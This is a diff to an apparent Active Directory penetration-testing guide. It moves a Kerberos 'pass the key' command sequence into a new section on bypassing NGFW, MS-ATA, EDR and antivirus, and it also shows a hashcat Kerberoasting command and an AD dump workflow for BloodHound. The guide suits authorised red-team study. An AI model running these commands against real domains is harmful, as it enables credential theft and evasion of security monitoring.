@@ -194,14 +194,6 @@ The next stage will be Brute-force. Once you have a service account, you can con
 hashcat -a 0 -m 13100 /tmp/hash /usr/share/wordlists/somelist.txt -w 4 -O
 ```
 
-To bypass protections such as MS-ATA use **Pass the key** attack:
-
-```
-Get-KerberosAESKey -Password somepassword -Salt JAKI.LOCALsomeuser
-getTGT.py jaki.local/someuser@scrm.local -aesKey 'yourkey'
-# and then Kerberos authentication
-```
-
 So we have several accounts, a lot of information from AD, how do we move on? First, you need to check those accounts in the Bloodhound database that you already have, carefully study their rights, groups, permissions. If you have cleartext passwords for SPN account - go back to them and try to go to the server specified in TGS using:
 
 ```
@@ -392,6 +384,20 @@ Change line in GetUsersPNs.py to say this: (and all impacket scripts)
 target = self.__kdcHost
 instead of this:
 target = self.getMachineName()
+```
+
+### Some bypass methods
+
+To bypass protection systems such as NGFW, MSATA, EDR, AV:
+
+Bloodhound AD dumping:
+You can use an Active Directory dump through [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer). After generating a .dat dump file, you can parse it using [ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py) and upload it to the Bloodhound database.
+
+Pass the key attack:
+```
+Get-KerberosAESKey -Password somepassword -Salt JAKI.LOCALsomeuser
+getTGT.py jaki.local/someuser@scrm.local -aesKey 'yourkey'
+# and then Kerberos authentication
 ```
 
 Useful links:
